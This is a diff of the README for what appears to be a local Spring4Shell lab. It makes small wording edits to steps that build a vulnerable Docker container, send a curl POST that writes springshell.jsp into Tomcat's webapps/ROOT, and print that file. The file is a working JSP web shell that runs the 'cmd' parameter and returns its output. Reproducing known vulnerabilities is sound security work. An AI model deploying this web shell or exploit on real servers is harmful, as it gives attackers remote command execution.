@@ -13,7 +13,7 @@
    - Run a container from the image        
  `mvn clean package && docker build . -t springshell && docker run --name springshell --rm -p 8080:8080 springshell`
 2. Run curl command attempts to create a jsp file in the tomcat webapps/ROOT folder. The jsp name is springshell.jsp
-   1. If the jsp is not created, there is no vulnerability
+   1. If the jsp is not created, _the application is not compromised_
 ```
 curl --request POST \
   --url http://localhost:8080/springshell/zeroday \
@@ -30,7 +30,7 @@ curl --request POST \
 3. Review jsp content:
 `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
 `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
-__This mean the application is compromised__
+_This means the application is compromised_
 
 
 4. Exploitation: Hit this url in the browser and update the shell cmd (_cmd_ query param) to print the result of the command
